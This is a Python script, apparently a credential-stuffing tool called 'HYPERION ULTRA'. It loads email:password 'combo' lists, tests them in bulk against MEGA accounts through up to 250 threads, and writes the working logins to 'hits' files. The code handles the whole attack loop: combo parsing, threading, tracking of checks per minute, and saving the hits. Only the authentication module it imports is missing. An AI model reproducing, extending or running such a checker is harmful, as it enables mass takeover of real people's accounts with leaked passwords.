#!/usr/bin/env python3
"""
🚀 HYPERION ULTRA v7.0 - STANDALONE REAL-TIME CHECKER
====================================================

Ultra-performance MEGA checker with real-time progress
- 250 thread checking
- Live progress updates
- Organized file structure
- Direct combo file processing

"""

import asyncio
import time
import os
import sys
import gc
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import psutil
from typing import List, Dict, Optional

# Import ultra authenticator
try:
    from mega_auth import UltraMegaAuthenticator
    MEGA_AUTH_AVAILABLE = True
    print("✅ Ultra MEGA authenticator loaded")
except ImportError:
    MEGA_AUTH_AVAILABLE = False
    print("❌ mega_auth.py not found - using fallback")

class UltraConfig:
    """Ultra performance configuration"""
    
    def __init__(self):
        # System specs
        self.cpu_cores = psutil.cpu_count()
        self.total_ram = psutil.virtual_memory().total / (1024**3)
        
        # Ultra performance settings
        self.max_threads = min(250, self.cpu_cores * 6)  # Ultra thread count
        self.target_cpu_usage = 85  # Target 85% CPU
        self.target_ram_usage = 75  # Target 75% RAM
        
        # File paths
        self.base_path = Path(__file__).parent
        self.combo_folder = self.base_path / "combos"
        self.hits_folder = self.base_path / "hits"
        self.backup_folder = self.base_path / "backups"
        
        # Create directories
        for folder in [self.combo_folder, self.hits_folder, self.backup_folder]:
            folder.mkdir(exist_ok=True)
        
        print(f"⚡ Ultra Config: {self.max_threads} threads, {self.cpu_cores} cores, {self.total_ram:.1f}GB RAM")

class StandaloneRealTimeChecker:
    """Standalone real-time MEGA checker"""
    
    def __init__(self, config: UltraConfig):
        self.config = config
        self.stats = {
            'total_checked': 0,
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'start_time': time.time(),
            'current_cpm': 0,
            'last_cpm_time': time.time(),
            'last_cpm_count': 0
        }
        self.running = False
        
    def print_progress(self, total_accounts: int):
        """Print real-time progress to console"""
        elapsed = time.time() - self.stats['start_time']
        progress_percent = (self.stats['total_checked'] / total_accounts * 100) if total_accounts > 0 else 0
        eta_minutes = ((total_accounts - self.stats['total_checked']) / max(self.stats['current_cpm'] / 60, 0.001)) if self.stats['total_checked'] > 0 else 0
        
        # System resources
        cpu_percent = psutil.cpu_percent()
        ram_percent = psutil.virtual_memory().percent
        
        # Clear screen and print progress
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"""
🚀 HYPERION ULTRA v7.0 - LIVE PROGRESS

📊 Progress: {self.stats['total_checked']:,}/{total_accounts:,} ({progress_percent:.1f}%)
⚡ CPM: {self.stats['current_cpm']:,}
🎯 Hits: {self.stats['hits']}
❌ Fails: {self.stats['fails']}
⚠️ Errors: {self.stats['errors']}

⏱️ Time: {int(elapsed//60)}m {int(elapsed%60)}s
🕒 ETA: {int(eta_minutes)}m

💻 System:
• CPU: {cpu_percent:.1f}% / {self.config.target_cpu_usage}%
• RAM: {ram_percent:.1f}% / {self.config.target_ram_usage}%
• Threads: {self.config.max_threads}

🔥 Status: CHECKING AT MAXIMUM SPEED!
        """)
    
    async def monitor_progress(self, total_accounts: int):
        """Monitor and display progress in real-time"""
        last_update = time.time()
        
        while self.running:
            try:
                current_time = time.time()
                
                # Update every 10 seconds
                if current_time - last_update >= 10:
                    self.print_progress(total_accounts)
                    last_update = current_time
                    
                    # Update CPM calculation
                    time_diff = current_time - self.stats['last_cpm_time']
                    if time_diff >= 60:  # Calculate CPM every minute
                        checks_in_period = self.stats['total_checked'] - self.stats['last_cpm_count']
                        self.stats['current_cpm'] = int(checks_in_period * 60 / time_diff)
                        self.stats['last_cpm_time'] = current_time
                        self.stats['last_cpm_count'] = self.stats['total_checked']
                
                await asyncio.sleep(1)
                
            except Exception as e:
                print(f"❌ Progress monitor error: {e}")
                break
    
    def progress_callback(self, checked, total, stats):
        """Progress callback for ultra authenticator"""
        self.stats.update(stats)
        self.stats['total_checked'] = checked
        
        # Quick progress update for fast feedback
        if checked % 100 == 0 or checked < 50:  # Show first 50, then every 100
            progress_percent = (checked / total * 100) if total > 0 else 0
            print(f"🔥 Progress: {checked:,}/{total:,} ({progress_percent:.1f}%) | CPM: {stats.get('current_cpm', 0):,} | Hits: {stats.get('hits', 0)}")
    
    async def process_results(self, results: List[Dict]):
        """Process and save results"""
        if not results:
            print("❌ No results to process")
            return
        
        # Separate hits and fails
        hits = [r for r in results if r.get('status') == 'hit']
        fails = [r for r in results if r.get('status') == 'fail']
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save hits
        if hits:
            hits_file = self.config.hits_folder / f"hits_{timestamp}.txt"
            with open(hits_file, 'w', encoding='utf-8') as f:
                for hit in hits:
                    f.write(f"{hit['email']}:{hit['password']}\n")
            print(f"✅ {len(hits)} hits saved to {hits_file}")
        
        # Save fails (optional)
        if fails:
            fails_file = self.config.hits_folder / f"checked_{timestamp}.txt"
            with open(fails_file, 'w', encoding='utf-8') as f:
                for fail in fails:
                    f.write(f"{fail['email']}:{fail['password']}\n")
            print(f"📝 {len(fails)} checked accounts saved to {fails_file}")
        
        # Final stats
        elapsed = time.time() - self.stats['start_time']
        print(f"""
🎉 CHECKING COMPLETE!

✅ Total Checked: {len(results):,}
🎯 Hits Found: {len(hits)}
⏱️ Time Taken: {int(elapsed//60)}m {int(elapsed%60)}s
⚡ Average CPM: {int(len(results) * 60 / elapsed) if elapsed > 0 else 0:,}

📁 Files saved to hits/ folder
        """)
    
    async def start_checking(self, combo_file_path: str):
        """Start standalone checking"""
        try:
            # Read combo file
            if not os.path.exists(combo_file_path):
                print(f"❌ Combo file not found: {combo_file_path}")
                return
            
            print(f"📁 Loading combo file: {combo_file_path}")
            
            with open(combo_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                combo_lines = [line.strip() for line in f if ':' in line and line.strip()]
            
            if not combo_lines:
                print("❌ No valid email:password combinations found in combo file")
                print("💡 Format should be: email:password (one per line)")
                return
            
            print(f"✅ Loaded {len(combo_lines):,} combos")
            
            # Prepare accounts
            accounts = []
            for line in combo_lines:
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        email, password = parts
                        accounts.append({'email': email.strip(), 'password': password.strip()})
            
            print(f"🎯 Prepared {len(accounts):,} accounts for checking")
            
            if not accounts:
                print("❌ No valid accounts to check")
                return
            
            # Initialize ultra authenticator
            if not MEGA_AUTH_AVAILABLE:
                print("❌ Ultra authenticator not available")
                return
            
            print(f"🔥 Initializing {self.config.max_threads} MEGA instances for ultra performance...")
            ultra_auth = UltraMegaAuthenticator(max_threads=self.config.max_threads)
            print(f"🎯 {self.config.max_threads} MEGA instances ready for ultra checking!")
            
            # Start checking
            self.running = True
            self.stats['start_time'] = time.time()
            
            print(f"""
🚀 STARTING ULTRA MEGA CHECKING
📊 Accounts to check: {len(accounts):,}
⚡ Ultra threads: {self.config.max_threads}
🎯 Target CPM: 10,000+
🔥 Mode: MAXIMUM PERFORMANCE
            """)
            
            # Start progress monitoring
            progress_task = asyncio.create_task(self.monitor_progress(len(accounts)))
            
            # Start checking in thread pool
            def run_checking():
                try:
                    print(f"🔥 Starting {self.config.max_threads} ultra worker threads...")
                    results = ultra_auth.ultra_check_accounts(accounts, self.progress_callback)
                    print(f"✅ {self.config.max_threads} ultra workers active!")
                    print(f"📤 Queuing {len(accounts):,} accounts...")
                    return results
                except Exception as e:
                    print(f"❌ Checking error: {e}")
                    return []
            
            # Run checking
            loop = asyncio.get_event_loop()
            with ThreadPoolExecutor(max_workers=1) as executor:
                results = await loop.run_in_executor(executor, run_checking)
            
            # Stop monitoring
            self.running = False
            progress_task.cancel()
            
            # Process results
            await self.process_results(results)
            
        except Exception as e:
            print(f"❌ Checking error: {e}")
            self.running = False

async def main():
    """Main entry point"""
    print("""
🚀 HYPERION ULTRA v7.0 - STANDALONE REAL-TIME CHECKER
=====================================================

🔥 ULTRA FEATURES:
• 250 thread maximum performance
• Real-time progress updates every 10 seconds
• Live CPM, CPU, RAM monitoring
• Organized file structure (combos/, hits/, backups/)
• Direct combo file processing

⚡ STARTING ULTRA INITIALIZATION...
    """)
    
    # Initialize configuration
    config = UltraConfig()
    
    # Find combo file
    base_path = Path(__file__).parent
    combo_paths = [
        base_path / "combo.txt",
        base_path / "combos" / "combo.txt",
        base_path / ".." / "Mega-Checker-by-Arboff-main" / "combo.txt",
        base_path / "test_combo.txt"
    ]
    
    combo_file = None
    for path in combo_paths:
        if path.exists() and path.stat().st_size > 0:
            combo_file = str(path)
            break
    
    if not combo_file:
        print("❌ No combo file found or combo file is empty!")
        print("📁 Looking for combo files in:")
        for path in combo_paths:
            print(f"   • {path}")
        print("\n💡 Please add email:password combinations to one of these files")
        
        # Create sample combo file
        sample_combo = base_path / "sample_combo.txt"
        with open(sample_combo, 'w') as f:
            f.write("test1@example.com:password123\n")
            f.write("test2@example.com:password456\n")
            f.write("test3@example.com:password789\n")
        
        print(f"✅ Created sample combo file: {sample_combo}")
        print("📝 Edit this file with your real combos and run again!")
        return
    
    print(f"✅ Found combo file: {combo_file}")
    
    # Initialize checker
    checker = StandaloneRealTimeChecker(config)
    
    # Start checking
    await checker.start_checking(combo_file)

if __name__ == "__main__":
    try:
        # Set high priority for maximum performance
        if os.name == 'nt':  # Windows
            import subprocess
            subprocess.run(['wmic', 'process', 'where', f'processid={os.getpid()}', 'CALL', 'setpriority', '128'], 
                         capture_output=True)
        else:  # Linux/Unix
            os.nice(-10)
        
        # Run the checker
        asyncio.run(main())
        
    except KeyboardInterrupt:
        print("\n🛑 Checking stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")